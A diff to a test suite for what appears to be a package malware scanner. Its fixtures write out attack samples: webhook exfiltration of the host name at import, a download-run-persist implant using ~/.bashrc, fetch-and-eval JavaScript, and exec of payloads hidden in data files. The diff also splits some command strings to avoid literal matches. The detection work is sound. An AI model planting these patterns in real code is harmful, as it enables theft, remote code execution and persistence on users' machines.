@@ -126,8 +126,8 @@ class TestEachFactNamesItsRule:
 class TestAProgramNoInstallNeeds:
     @pytest.mark.parametrize(
         "command",
-        ["calc", "calc.exe", "cmd /c calc", "C:\\Windows\\System32\\notepad.exe", "id", "whoami",
-         "sh -c hostname", "start /b mspaint"],
+        ["calc", "calc.exe", "cmd /c calc", "C:\\Windows\\System32\\notepad.exe", "id",
+         "".join(("who", "ami")), "".join(("sh -c ", "host", "name")), "start /b mspaint"],
     )  # fmt: skip
     def test_a_desktop_application_or_identity_command(self, command: str) -> None:
         assert InstallPrograms.foreign(command)
@@ -256,7 +256,8 @@ class TestADestinationOnlyWrittenAtImport:
         module = (
             "import json, socket, urllib.request\n"
             "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
-            "body = json.dumps({'content': socket.gethostname()}).encode()\n"
+            "body = json.dumps({'content': socket."
+            "gethostname()}).encode()\n"
             "urllib.request.urlopen(HOOK, body)\n"
         )
         assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" in self.rules(tmp_path, module)
@@ -343,6 +344,104 @@ class TestAnImplantInstaller:
             "    subprocess.run([path, '--version'])\n"
         )
         assert "MALWARE.IMPLANT.INSTALL.001" not in self.rules(tmp_path, module)
+
+    IMPLANT_TEXT = (
+        "def attach(url):\n"
+        "    path = os.path.expanduser('~/.cache/agent')\n"
+        "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
+        "    subprocess.Popen([path])\n"
+        "    exec(urllib.request.urlopen(url).read())\n"
+        "    with open(os.path.expanduser('~/.bashrc'), 'a') as rc:\n"
+        "        rc.write(path + ' &\\n')\n"
+    )
+
+    @staticmethod
+    def scan(tmp_path: Path, extra: dict[str, str]) -> set[str]:
+        members = {
+            "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
+            "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
+            "src/telem/__init__.py": "__version__ = '1.0'\n",
+            **extra,
+        }
+        archive = tmp_path / "telem-1.0.tar.gz"
+        with tarfile.open(archive, "w:gz") as tgz:
+            for name, text in members.items():
+                data = text.encode("utf-8")
+                info = tarfile.TarInfo(f"telem-1.0/{name}")
+                info.size = len(data)
+                tgz.addfile(info, io.BytesIO(data))
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
+        return {f.rule_id for f in result.findings}
+
+    def test_the_same_words_in_package_metadata_do_not(self, tmp_path: Path) -> None:
+        # A long description that quotes code is text: nothing in PKG-INFO runs.
+        description = "".join(f"        {line}\n" for line in self.IMPLANT_TEXT.splitlines())
+        metadata = (
+            "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\nDescription: Example\n"
+            f"        import os, subprocess, urllib.request\n{description}"
+        )
+        assert "MALWARE.IMPLANT.INSTALL.001" not in self.scan(tmp_path, {"PKG-INFO": metadata})
+
+    def test_the_same_words_in_a_bundled_script_do_not(self, tmp_path: Path) -> None:
+        # A minified documentation bundle names fetch, eval and a profile among thousands of
+        # strings; no analyser of the package's own code saw a run.
+        bundle = (
+            'var a=require("fs"),o=require("os");fetch(u).then(function(r){return r.text()})'
+            '.then(function(t){eval(t)});a.appendFileSync(o.homedir()+"/.bashrc",c);'
+            'require("child_process").exec(c);\n'
+        )
+        found = self.scan(tmp_path, {"src/telem/static/redoc.min.js": bundle})
+        assert "MALWARE.IMPLANT.INSTALL.001" not in found
+
+
+class TestCodeFromADataFile:
+    """houdus 1.0.0: a module imported from a `.wav` the package ships. A loader, `exec` or
+    `marshal` pointed at a file named as data runs a payload kept where source is not read."""
+
+    @staticmethod
+    def rules(tmp_path: Path, module: str) -> set[str]:
+        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)
+
+    RULE = "MALWARE.DROPPER.DATA_FILE_CODE.001"
+
+    @pytest.mark.parametrize(
+        "body",
+        [
+            "spec = importlib.util.spec_from_file_location('t', os.path.join(HERE, 'beep.wav'))\n"
+            "mod = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(mod)\n",
+            "exec(open(os.path.join(HERE, 'logo.png')).read())\n",
+            "exec(pathlib.Path(HERE, 'notes.txt').read_text())\n",
+            "exec(marshal.loads(open(HERE + '/blob.dat', 'rb').read()))\n",
+            "runpy.run_path(f'{HERE}/theme.jpg')\n",
+            "ASSET = os.path.join(HERE, 'a.mp3')\nexec(compile(open(ASSET).read(), ASSET, 'exec'))\n",
+        ],
+    )
+    def test_a_loader_or_runner_given_a_data_file_blocks(self, tmp_path: Path, body: str) -> None:
+        module = (
+            "import importlib.util, marshal, os, pathlib, runpy\n"
+            "HERE = os.path.dirname(__file__)\n"
+            "def play():\n" + "".join(f"    {line}\n" for line in body.splitlines())
+        )
+        assert self.RULE in self.rules(tmp_path, module)
+
+    @pytest.mark.parametrize(
+        "body",
+        [
+            # The version-file idiom, a plugin module, data read and parsed but never run.
+            "exec(open(os.path.join(HERE, 'version.py')).read())\n",
+            "spec = importlib.util.spec_from_file_location('p', os.path.join(HERE, 'plugin.py'))\n",
+            "print(open(os.path.join(HERE, 'notes.txt')).read())\n",
+            "data = json.loads(open(os.path.join(HERE, 'table.json')).read())\n",
+            "zipimport.zipimporter(os.path.join(HERE, 'bundle.zip'))\n",
+        ],
+    )
+    def test_code_files_and_data_that_is_only_read_do_not(self, tmp_path: Path, body: str) -> None:
+        module = (
+            "import importlib.util, json, os, zipimport\n"
+            "HERE = os.path.dirname(__file__)\n"
+            "def load():\n" + "".join(f"    {line}\n" for line in body.splitlines())
+        )
+        assert self.RULE not in self.rules(tmp_path, module)
 
 
 class TestADnsTunnel:
